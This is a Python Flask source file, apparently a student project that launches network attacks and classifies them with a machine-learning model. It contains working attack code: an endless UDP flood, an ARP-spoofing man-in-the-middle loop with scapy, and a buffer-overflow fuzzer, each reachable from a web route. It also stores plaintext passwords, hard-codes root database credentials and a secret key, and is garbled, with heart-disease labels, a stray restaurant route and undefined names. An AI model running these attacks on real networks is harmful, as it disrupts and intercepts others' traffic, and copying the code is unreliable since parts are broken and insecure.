from flask import Flask, render_template, request, session, url_for, redirect, jsonify
import pymysql
#================================
import pickle
import pandas as pd
from sklearn.preprocessing import StandardScaler
import numpy as np
from flask_uploads import UploadSet, configure_uploads, IMAGES
import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
import pickle
import sys,socket 

from collections import Counter
from sklearn import preprocessing

le = preprocessing.LabelEncoder()

address = '127.0.0.1'
port = 8080
buffer = ['\x41']
targetIP=address
spoofIP="192.168.0.108"
gatewayIP="192.168.0.1"
destinationMac="18-A6-F7-17-BB-32"


now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

os.system("clear")
os.system("figlet DDos Attack")

import scapy.all as scapy
import time
import argparse
import sys

#--------------unsupervised----------


def BufferoverflowAttack():
    counter = 100
    while len(buffer)<= 10:
        buffer.append('\x41'*counter)
        counter=counter+100
    try:
        for string in buffer:
            print ('[+] Sending %s bytes...' % len(string))
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            connect=s.connect((address,port))
            s.recv(1024)
            s.send(string + '\r\n')
            print ('[+] Done')
    except:
        print ('[!] Unable to connect to the application. You may have crashed it.')
        sys.exit(0)
    finally:
        s.close()
        
        
def DosAttack():
    
    os.system("clear")
    os.system("figlet Attack Starting")
    print ("[                    ] 0% ")
    time.sleep(5)
    print ("[=====               ] 25%")
    time.sleep(5)
    print ("[==========          ] 50%")
    time.sleep(5)
    print ("[===============     ] 75%")
    time.sleep(5)
    print ("[====================] 100%")
    time.sleep(3)
    sent = 0
    while True:
         bytes = random._urandom(1490)
         sock.sendto(bytes, (address,port))
     #sent = sent + 1
     #port = port + 1
         print ("Sent %s packet to %s throught port:%s"%(sent,address,port))
    
    
def spoofer(targetIP, spoofIP):
    packet=scapy.ARP(op=2,pdst=targetIP,hwdst=destinationMac,psrc=spoofIP)
    scapy.send(packet, verbose=False)
    



def restore(destinationIP, sourceIP):
    packet = scapy.ARP(op=2,pdst=destinationIP,hwdst=getMac(destinationIP),psrc=sourceIP,hwsrc=sourceMAC)
    scapy.send(packet, count=4,verbose=False)
def startMIMAttack():
    packets = 0
    try:
        while True:
            spoofer(targetIP,gatewayIP)
            spoofer(gatewayIP,targetIP)
            print("\r[+] Sent packets "+ str(packets)),
            sys.stdout.flush()
            packets +=2
            time.sleep(2)
    except KeyboardInterrupt:
        print("\nInterrupted Spoofing found CTRL + C------------ Restoring to normal state..")
        restore(targetIP,gatewayIP)
        restore(gatewayIP,targetIP)


filename = 'annmodel.sav'

class_obt=class_obt={0:'normal',
                     1:'atrial fibrillation',
                     2:'myocardial infraction or 3.bundle branch block',
                     3:'Ischemic changes',
                     4:'other heart disease type',
                     5:'other heart disease type',
                     6:'other heart disease type',
                     7:'other heart disease type',
                      8:'other heart disease type',
                     9:'other heart disease type',
                     10:'other heart disease type',
                     11:'other heart disease type'
                     }


#--------------random forest----------

#def randomforestprediction():
import numpy as np
import pandas as pd
import matplotlib.pyplot as plt
import seaborn as sns
from sklearn.metrics import average_precision_score
from sklearn.model_selection import cross_val_score
from sklearn.metrics import precision_recall_curve
from sklearn.metrics import confusion_matrix
from sklearn.metrics import accuracy_score
from sklearn.metrics import roc_curve
from sklearn.metrics import f1_score
from sklearn.metrics import precision_score, recall_score
from sklearn.metrics import roc_auc_score, roc_curve
from sklearn.metrics import auc
from sklearn.model_selection import train_test_split
from sklearn.ensemble import RandomForestClassifier
from FilterPackets import *
import os
print(os.listdir())

import warnings
warnings.filterwarnings('ignore')

sc = StandardScaler()

#================================

app = Flask(__name__)
app.secret_key = 'random string'

app.config['UPLOADED_PHOTOS_DEST'] = 'static/uploaded_images'
photos = UploadSet('photos', IMAGES)
configure_uploads(app, photos)

df=pd.read_csv('flowdata//test.pcap.csv')
df1=pd.read_csv('pcapdata//test.pcap.csv',error_bad_lines=False)
#Database Connection
def dbConnection():
    connection = pymysql.connect(host="localhost", user="root", password="root", database="attack_dos")
    return connection


#close DB connection
def dbClose():
    dbConnection().close()
    return


@app.route('/index')
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/home')
def home():
    if 'user' in session:
        return render_template('home.html',user=session['user'])
    return redirect(url_for('index'))

@app.route('/login', methods=["GET","POST"])
def login():
    msg = ''
    if request.method == "POST":
        # session.pop('user',None)
        mobno = request.form.get("mobno")
        password = request.form.get("pas")
        # print(mobno+password)
        con = dbConnection()
        cursor = con.cursor()
        result_count = cursor.execute('SELECT * FROM userdetails WHERE mobile = %s AND password = %s',
                                      (mobno, password))
        if result_count > 0:
            print(result_count)
            session['user'] = mobno
            #return redirect(url_for('home'))
            return jsonify(dict(redirect='home'))
        else:
            print(result_count)
            msg = 'Incorrect username/password!'
            return msg
    return render_template('login.html')



@app.route('/register', methods=["GET","POST"])
def register():
    print("register")
    if request.method == "POST":
        try:
            name = request.form.get("name")
            address = request.form.get("address")
            mailid = request.form.get("mailid")
            mobile = request.form.get("mobile")
            pass1 = request.form.get("pass1")

            con = dbConnection()
            cursor = con.cursor()
            cursor.execute('SELECT * FROM userdetails WHERE mobile = %s', (mobile))
            res = cursor.fetchone()
            if not res:
                sql = "INSERT INTO userdetails (name, address, email, mobile, password) VALUES (%s, %s, %s, %s, %s)"
                val = (name, address, mailid, mobile, pass1)
                cursor.execute(sql, val)
                con.commit()
                status= "success"
                print(status)
                #return redirect(url_for('index'))
                return jsonify(dict(redirect='login'))
            else:
                status = " Mobile no. already Registered"
            return status
        except:
            print("Exception occured at user registration")
            return redirect(url_for('index'))
        finally:
            dbClose()
    return render_template('register.html')


@app.route('/ApplyDOSAttack', methods=["GET","POST"])
def ApplyDOSAttack():
    if request.method == "POST":
        checkingandprtinting('DOS')
        DosAttack()
    return ''

@app.route('/ApplyMIMattack', methods=["GET","POST"])
def ApplyMIMattack():
    if request.method == "POST":
        checkingandprtinting('MIM')
        startMIMAttack()
        
    return redirect(url_for('prediction'))


@app.route('/ApplyBufferOverflowAttack', methods=["GET","POST"])
def ApplyBufferOverflowAttack():
    if request.method == "POST":
        checkingandprtinting('BO')
        BufferoverflowAttack()
    return redirect(url_for('prediction'))

def most_frequent(List): 
        return max(set(List), key = List.count) 
    
def DetectTypeOfAttack1():
    #df2=pd.read_csv("")
    
    file = open("ann_model.sav",'rb')
    annmodel=pickle.load(file)
    
    listofattack=['BO', 'DOS', 'MIM']

    
    df31=pd.read_csv("outputofforalgorithm1.csv",header=None)
    df3 = df31.iloc[:, :-1]
    df3=df3.apply(le.fit_transform)
    y_pred_ann1 = annmodel.predict(df3)
    listofpred=list(y_pred_ann1)
    List =listofpred
    print(listofattack[most_frequent(List)]) 
    attack=listofattack[most_frequent(List)]
    attackobt=getsysteminfo()
    x = 0
    d = Counter(listofpred)
    x1 = 1
    d1 = Counter(listofpred)
    x2 = 2
    d2 = Counter(listofpred)
    
    dfirst=d[x]
    dsecond=d2[x2]
    
    if dfirst>2:
       attack=listofattack[0] 
    if dsecond>1:
       attack=listofattack[2] 
    
    
    
    print(listofpred)

  
    
    return attack,attackobt

@app.route('/detecttypeofattack', methods=["GET","POST"])
def detecttypeofattack():
    if request.method == "POST":
        op,op1=DetectTypeOfAttack1()
    return render_template('predictResult.html',user=session['user'], data="     "+op1)


@app.route('/filterpacket', methods=['POST'])
def filterpackets():
    filterpacketsall()
    # Main page
    return df1.to_html(header="true", table_id="table")#render_template('index.html')

def checkingandprtinting(nameprint):
     con = dbConnection()
     cursor = con.cursor()
     sqltodelete="delete from checkingtest"
     cursor.execute(sqltodelete)
     con.commit()
     
     sql = "INSERT INTO checkingtest VALUES (%s)"
     val = (nameprint)
     cursor.execute(sql, val)
     con.commit()
     
def getsysteminfo():
    
    con = dbConnection()
    cursor = con.cursor()
    cursor.execute('SELECT * FROM checkingtest')
    res = cursor.fetchone()
    print(res)
    namethecheck=res[0]
    return namethecheck

@app.route('/displaydata', methods=['POST'])
def displaydata():
    # Main page
    return df.to_html(header="true", table_id="table")#render_template('index.html')

@app.route('/prediction', methods=["GET","POST"])
def prediction():
    if 'user' in session:
       return render_template('prediction.html', user=session['user'])
    return redirect(url_for('index'))



@app.route('/restarauntlocation', methods=['GET', 'POST'])
def upload():
    if request.method == 'POST':
        #result = model_predict(file_path, model)
        python2json = json.dumps(keyvalue)
        return python2json

    return None




@app.route('/dataset')
def dataset():
    if 'user' in session:
        con = dbConnection()
        cursor = con.cursor()
        cursor.execute('SELECT * FROM dataset')
        results = cursor.fetchall()
        return render_template('dataset.html',user=session['user'], data=results)
    return redirect(url_for('index'))


@app.route('/video')
def video():
    if 'user' in session:
        return render_template('video.html',user=session['user'])
    return redirect(url_for('index'))


@app.route('/review')
def review():
    if 'user' in session:
        return render_template('review.html',user=session['user'])
    return redirect(url_for('index'))


@app.route('/about')
def about():
    if 'user' in session:
        return render_template('about.html',user=session['user'])
    return redirect(url_for('index'))


#logout code
@app.route('/logout')
def logout():
    session.pop('user')
    return redirect(url_for('index'))


if __name__ == '__main__':
    app.run('0.0.0.0')
    #app.run()
